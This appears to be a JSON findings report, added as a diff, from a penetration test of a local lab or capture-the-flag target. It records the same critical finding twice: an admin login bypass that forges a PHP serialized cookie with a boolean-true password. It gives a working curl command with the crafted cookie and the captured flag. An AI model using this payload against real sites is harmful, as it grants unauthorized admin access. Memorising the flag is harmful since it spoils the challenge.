@@ -1,0 +1,41 @@
+{
+  "meta": {
+    "created": "2026-04-14T14:10:31.122033+00:00",
+    "target": ""
+  },
+  "findings": [
+    {
+      "id": "48133173-6c9b-435e-b2e8-7948d1b02b79",
+      "timestamp": "2026-04-14T14:10:31.121906+00:00",
+      "title": "Authentication Bypass via PHP Serialized Cookie Manipulation",
+      "severity": "critical",
+      "target": "http://172.17.0.1:60505",
+      "description": "The application uses PHP serialized data stored in a base64-encoded 'creds' cookie for authentication. By manipulating the cookie value to set the password field to a boolean true (b:1), the authentication check is bypassed due to PHP's loose type comparison (== instead of ===). This allows any attacker to authenticate as admin without knowing the actual password.",
+      "evidence": "flag{f42b6ccb-617d-4aad-b3ea-f96f1d1c85a3}",
+      "tool_used": "manual_http",
+      "cve": "",
+      "reproduction": {
+        "type": "http",
+        "command": "curl -b 'creds=YToyOntzOjg6InVzZXJuYW1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtiOjE7fQ==' http://172.17.0.1:60505/index.php",
+        "expected": "Response contains 'Welcome Admin' and the flag"
+      }
+    },
+    {
+      "id": "ccbd1eb5-2488-43ef-94b4-8933264e6fa7",
+      "timestamp": "2026-04-14T14:10:31.211703+00:00",
+      "title": "Authentication Bypass via PHP Serialized Cookie Manipulation",
+      "severity": "critical",
+      "target": "http://172.17.0.1:60505",
+      "description": "The application uses PHP serialized data stored in a base64-encoded 'creds' cookie for authentication. By manipulating the cookie value to set the password field to a boolean true (b:1), the authentication check is bypassed due to PHP's loose type comparison (== instead of ===). This allows any attacker to authenticate as admin without knowing the actual password.",
+      "evidence": "flag{f42b6ccb-617d-4aad-b3ea-f96f1d1c85a3}",
+      "tool_used": "manual_http",
+      "cve": "",
+      "reproduction": {
+        "type": "http",
+        "command": "curl -b 'creds=YToyOntzOjg6InVzZXJuYW1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtiOjE7fQ==' http://172.17.0.1:60505/index.php",
+        "expected": "Response contains 'Welcome Admin' and the flag"
+      }
+    }
+  ],
+  "diagrams": []
+}
